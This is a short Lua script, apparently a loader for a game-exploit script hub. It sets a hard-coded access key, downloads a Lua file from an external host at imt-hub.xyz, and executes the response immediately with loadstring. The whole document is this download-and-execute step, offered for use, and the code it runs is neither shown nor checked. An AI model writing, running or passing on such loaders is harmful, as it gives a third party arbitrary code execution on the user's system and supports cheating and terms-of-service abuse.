ACTIVE_KEY = "5c4965bbf469ca914edb8395bd5a2b50"

local res = http_request({
    Url = "https://api.imt-hub.xyz/files/v2/loaders/6mss1famhjy2gasnw5w481j8b9yr42ji.lua",
    Method = "GET"
})

loadstring(res.Body)()
